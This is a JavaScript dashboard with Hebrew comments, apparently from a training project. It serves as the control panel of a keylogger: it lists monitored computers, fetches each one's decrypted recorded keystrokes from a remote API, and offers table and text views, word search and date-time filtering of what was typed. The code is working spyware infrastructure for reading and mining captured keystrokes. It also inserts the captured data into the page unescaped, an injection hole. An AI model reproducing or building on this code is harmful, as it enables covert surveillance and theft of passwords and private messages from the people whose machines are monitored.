// כתובת ה-API לשירות
const API_URL = 'https://kodcode.shteinman.co.uk/api';

/**
 * בדיקת התחברות – במידה והמשתמש לא מחובר, מפנים לעמוד הלוגין.
 */
if (sessionStorage.getItem("loggedIn") !== "true") {
    window.location.href = "/login";
}

/**
 * פונקציה לבדיקת תקינות הטוקן שמתקבל מהשרת.
 * במידה והתשובה היא 401 (או שגיאה דומה), נבצע ניתוק ונפנה לעמוד הלוגין.
 * @param {Response} response - התשובה מהשרת
 * @returns {boolean} - האם הטוקן תקין
 */
function checkTokenValidity(response) {
    if (response.status === 401) {
        alert("הטוקן אינו תקין או שפג תוקפו. אנא התחבר מחדש.");
        disconnectUser();
        return false;
    }
    return true;
}

/**
 * פונקציה לניתוק משתמש.
 * מנקה את הנתונים המאוחסנים ב-sessionStorage ו-localStorage ומפנה לעמוד הלוגין.
 */
function disconnectUser() {
    sessionStorage.removeItem("loggedIn");
    sessionStorage.removeItem("token");
    localStorage.removeItem("token");
    localStorage.removeItem("loggedIn");
    window.location.href = "/login";
}

/**
 * פונקציה שמחליפה את תצוגת רשימת המחשבים.
 * בעת מעבר לבחירת מחשב, נסתר גם נתוני הקשות קודמים.
 */
function toggleComputersList() {
    const section = document.getElementById("computers_section");
    // נסתר את הנתונים הקודמים (טבלה, תצוגת טקסט, סינון וכפתור "סגור נתונים")
    hideData();
    if (section.style.display === "none" || !section.style.display) {
        section.style.display = "block";
        fetchComputersList();
    } else {
        section.style.display = "none";
    }
}

/**
 * שליפת רשימת המחשבים מה-API.
 * מוסיפים את הטוקן לבקשה ובודקים תקינות התשובה.
 */
async function fetchComputersList() {
    try {
        const token = localStorage.getItem("token");
        const response = await fetch(`${API_URL}/machine`, {
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });

        // בדיקת תקינות הטוקן – במידה וטוקן אינו תקין, הפונקציה תסתיים
        if (!checkTokenValidity(response)) return;

        const computers = await response.json();
        renderComputersList(computers);
    } catch (error) {
        console.error('Error fetching computers:', error);
    }
}

/**
 * מציג את רשימת המחשבים בתוך האלמנט המתאים.
 * במקרה ואין מחשבים, מציג הודעת "אין מחשבים".
 * @param {Array} computers - מערך אובייקטים של מחשבים
 */
function renderComputersList(computers) {
    const container = document.getElementById("computer_list");
    container.innerHTML = '';
    if (!computers || computers.length === 0) {
        container.innerHTML = '<p class="empty-state">No computers were found!</p>';
        return;
    }
    // עבור כל מחשב, יוצרים "כרטיס" עם שם ומזהה
    computers.forEach(computer => {
        const card = document.createElement('div');
        card.className = 'computer-card';
        card.innerHTML = `<strong>${computer.name}</strong><br><small>ID: ${computer.id}</small>`;
        card.addEventListener("click", async function(e) {
            e.preventDefault();
            // אם הכרטיס כבר במצב טעינה, לא נבצע פעולה נוספת
            if (card.classList.contains("loading")) return;
            card.classList.add("loading");
            await getComputerKeys(computer.name);
            card.classList.remove("loading");
        });
        container.appendChild(card);
    });
}

/**
 * שולח בקשה לקבלת נתוני הקשות עבור מחשב ספציפי.
 * @param {string} computerID - מזהה/שם המחשב
 */
async function getComputerKeys(computerID) {
    try {
        const token = localStorage.getItem("token");
        const response = await fetch(`${API_URL}/machine/${computerID}`, {
            headers: {
                "Authorization": `Bearer ${token}`
            }
        });

        // בדיקת תקינות הטוקן
        if (!checkTokenValidity(response)) return;

        const keyStrokes = await response.json();
        // אם יש נתוני הקשות – מטפלים בהם, אחרת מעבירים מערך ריק
        if (Array.isArray(keyStrokes) && keyStrokes.length > 0) {
            handleComputerClick(keyStrokes);
        } else {
            handleComputerClick([]);
        }
    } catch (error) {
        console.error("Error fetching keystrokes:", error);
    }
}

/**
 * מציג חלון מודאל לבחירת תצוגה עבור נתוני ההקשות.
 * המשתמש יכול לבחור להציג את הנתונים בטבלה או כתצוגת טקסט.
 * @param {Array} keyStrokes - נתוני ההקשות
 */
function showViewChoiceModal(keyStrokes) {
    const modal = document.getElementById("view-choice-modal");
    if (!modal) {
        console.error("Modal element not found. Please ensure it exists.");
        return;
    }
    modal.classList.remove("hidden");

    const tableButton = document.getElementById("table-view-button");
    const textButton = document.getElementById("text-view-button");
    if (!tableButton || !textButton) {
        console.error("Modal buttons not found. Check your HTML.");
        return;
    }

    // לחיצה על כפתור תצוגת טבלה – מציגה את הנתונים בטבלה ומראה את סקשן הסינון
    tableButton.onclick = () => {
        renderTable(keyStrokes);
        modal.classList.add("hidden");
        showFilters();
    };

    // לחיצה על כפתור תצוגת טקסט – מציגה את הנתונים כתצוגת טקסט
    textButton.onclick = () => {
        renderStringOutput(keyStrokes);
        modal.classList.add("hidden");
        // אפשר להוסיף כאן גם קריאה ל-showFilters() אם נדרש
    };
}

/**
 * מטפל בלחיצה על מחשב.
 * במידה וקיימים נתוני הקשות, מציג חלון לבחירת תצוגה.
 * @param {Array} keyStrokes - נתוני ההקשות של המחשב הנבחר
 */
async function handleComputerClick(keyStrokes) {
    if (!keyStrokes || keyStrokes.length === 0) {
        console.warn("No keystroke data available.");
        return;
    }
    showViewChoiceModal(keyStrokes);
}

/**
 * מציג נתוני הקשות בטבלה.
 * בודק אם קיימים נתונים, ומציג הודעה במקרה שאין.
 * בנוסף, מסיר את המחלקה "hidden" מהכפתור "סגור נתונים" כדי להציגו.
 * @param {Array} keyStrokes - נתוני ההקשות
 */
function renderTable(keyStrokes) {
    const table = document.getElementById("data-table");
    const tbody = table.querySelector("tbody");
    // מציגים את הטבלה ומסתירים את תצוגת הטקסט
    table.style.display = "table";
    document.getElementById("output").style.display = "none";
    tbody.innerHTML = '';

    // מציגים את כפתור "סגור נתונים"
    document.getElementById("close-data-button").classList.remove("hidden");

    if (keyStrokes.length === 0) {
        tbody.innerHTML = `<tr><td colspan="6">No data available</td></tr>`;
        return;
    }
    keyStrokes.forEach(row => {
        const tr = document.createElement("tr");
        tr.innerHTML = `
            <td>${row.year}</td>
            <td>${row.month}</td>
            <td>${row.day}</td>
            <td>${row.hour}</td>
            <td>${row.minute}</td>
            <td>${row.decrypted_data}</td>
        `;
        tbody.appendChild(tr);
    });
}

/**
 * מציג נתוני הקשות כתצוגת טקסט.
 * במידה ואין נתונים – מציג הודעה מתאימה.
 * בנוסף, מסיר את המחלקה "hidden" מהכפתור "סגור נתונים" כדי להציגו.
 * @param {Array} keyStrokes - נתוני ההקשות
 */
function renderStringOutput(keyStrokes) {
    const outputDiv = document.getElementById("output");
    // מציגים את תצוגת הטקסט ומסתירים את הטבלה
    outputDiv.style.display = "block";
    document.getElementById("data-table").style.display = "none";

    // מציגים את כפתור "סגור נתונים"
    document.getElementById("close-data-button").classList.remove("hidden");

    if (keyStrokes.length === 0) {
        outputDiv.innerText = "אין נתונים להצגה.";
        return;
    }
    const textOutput = keyStrokes.map(row => row.decrypted_data).join(" ");
    outputDiv.innerText = `הקלדות שהוקלטו: ${textOutput}`;
}

/**
 * מציג את סקשן הסינון על מנת לאפשר סינון וחיפוש בטבלה.
 */
function showFilters() {
    const filterSection = document.getElementById("filter_section");
    filterSection.classList.remove("hidden");
}

/**
 * מסנן את הטבלה לפי טקסט חיפוש.
 * מסיר הדגשות קודמות ומוסיף highlight לשורות מתאימות.
 */
function filterTable() {
    const input = document.getElementById("search-input");
    const filter = input.value.toLowerCase();
    const table = document.getElementById("data-table");
    const tbody = table.querySelector("tbody");
    const rows = tbody.getElementsByTagName("tr");

    // מסיר highlight מכל שורה ובודק האם לכל שורה לכלול את מילות החיפוש
    for (let row of rows) {
        row.classList.remove("highlight");
        row.style.display = row.innerText.toLowerCase().includes(filter) ? "" : "none";
    }
}

/**
 * מסנן את הטבלה לפי טווח תאריך ושעה.
 * מקבל את התאריכים והשעות מהקלט ומסתיר שורות שלא נופלות בטווח.
 */
function filterByDateTime() {
    const startDate = document.getElementById("start-date").value;
    const startTime = document.getElementById("start-time").value || "00:00";
    const endDate = document.getElementById("end-date").value;
    const endTime = document.getElementById("end-time").value || "23:59";

    // המרת התאריכים והשעות לאובייקטים מסוג Date
    const startDateTime = startDate ? new Date(`${startDate}T${startTime}`) : null;
    const endDateTime = endDate ? new Date(`${endDate}T${endTime}`) : null;

    const table = document.getElementById("data-table");
    const tbody = table.querySelector("tbody");
    const rows = tbody.getElementsByTagName("tr");

    // עבור כל שורה, בודקים אם התאריך נופל בטווח המבוקש
    for (let row of rows) {
        const cells = row.getElementsByTagName("td");
        if (cells.length < 5) continue;
        const year = cells[0].innerText;
        const month = cells[1].innerText.padStart(2, '0');
        const day = cells[2].innerText.padStart(2, '0');
        const hour = cells[3].innerText.padStart(2, '0');
        const minute = cells[4].innerText.padStart(2, '0');
        const rowDateTime = new Date(`${year}-${month}-${day}T${hour}:${minute}`);
        row.style.display =
            (startDateTime && rowDateTime < startDateTime) ||
            (endDateTime && rowDateTime > endDateTime) ? "none" : "";
    }
}

/**
 * פונקציית debouncing למניעת קריאות מרובות בזמן הקלדה.
 * @param {Function} func - הפונקציה לביצוע
 * @param {number} delay - זמן עיכוב במילישניות
 * @returns {Function} - הפונקציה המעוכבת
 */
function debounce(func, delay) {
    let debounceTimer;
    return function() {
        const context = this;
        const args = arguments;
        clearTimeout(debounceTimer);
        debounceTimer = setTimeout(() => func.apply(context, args), delay);
    };
}

/**
 * חיפוש והדגשת שורות בטבלה לפי מילות חיפוש.
 * בודק את הטקסט, מוסיף highlight לשורות מתאימות ומגלגל לשורה הראשונה התואמת.
 */
function searchAndHighlight() {
    const input = document.getElementById("word-search");
    const term = input.value.trim().toLowerCase();
    const table = document.getElementById("data-table");
    const tbody = table.querySelector("tbody");
    const rows = tbody.getElementsByTagName("tr");
    let firstMatch = null;

    // מסיר highlight מכל השורות
    for (let row of rows) {
        row.classList.remove("highlight");
    }
    if (term === "") return;
    // מוסיף highlight לשורות התואמות את מילות החיפוש
    for (let row of rows) {
        if (row.innerText.toLowerCase().includes(term)) {
            row.classList.add("highlight");
            if (!firstMatch) firstMatch = row;
        }
    }
    // מגלגל אוטומטית לשורה הראשונה התואמת
    if (firstMatch) {
        firstMatch.scrollIntoView({ behavior: "smooth", block: "center" });
    }
}

// הוספת מאזין עם debouncing לשדה החיפוש
document.getElementById("word-search")?.addEventListener("keyup", debounce(searchAndHighlight, 300));

// מאזין לכפתור ניתוק המשתמש
document.getElementById("disconnect-button")?.addEventListener("click", disconnectUser);

/**
 * פונקציה להסתרת כל נתוני ההקשות, תצוגת הסינון וכפתור "סגור נתונים".
 * משמשת גם בעת מעבר בין תצוגות או לחיצה על כפתור סגירה.
 */
function hideData() {
    document.getElementById("data-table").style.display = "none";
    document.getElementById("output").style.display = "none";
    document.getElementById("filter_section").classList.add("hidden");
    // נסגרים גם חלון המודאל וכפתור "סגור נתונים"
    document.getElementById("view-choice-modal")?.classList.add("hidden");
    document.getElementById("close-data-button")?.classList.add("hidden");
}

// מאזין לכפתור סגירת הנתונים (וודא שקיים כפתור עם המזהה "close-data-button" ב-HTML)
document.getElementById("close-data-button")?.addEventListener("click", hideData);
